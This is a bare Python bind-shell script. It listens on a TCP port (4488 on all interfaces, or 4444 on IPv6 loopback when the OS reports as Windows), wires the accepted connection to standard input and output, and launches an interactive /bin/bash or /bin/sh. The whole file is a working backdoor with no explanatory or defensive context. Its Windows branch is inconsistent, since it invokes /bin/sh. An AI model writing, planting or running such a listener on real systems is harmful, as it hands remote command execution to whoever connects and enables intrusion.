import socket
import os
import subprocess

if os.name == 'nt':
    s = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
    s.bind(("::1", 4444, 0, 2))
    s.listen(5)
    c, a = s.accept()
    os.dup2(c.fileno(), 0)
    os.dup2(c.fileno(), 1)
    os.dup2(c.fileno(), 2)
    p = subprocess.call(["/bin/sh", "-i"])

else:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("0.0.0.0", 4488))
    s.listen(5)
    c, a = s.accept()
    os.dup2(c.fileno(), 0)
    os.dup2(c.fileno(), 1)
    os.dup2(c.fileno(), 2)
    p = subprocess.call(["/bin/bash", "-i"])
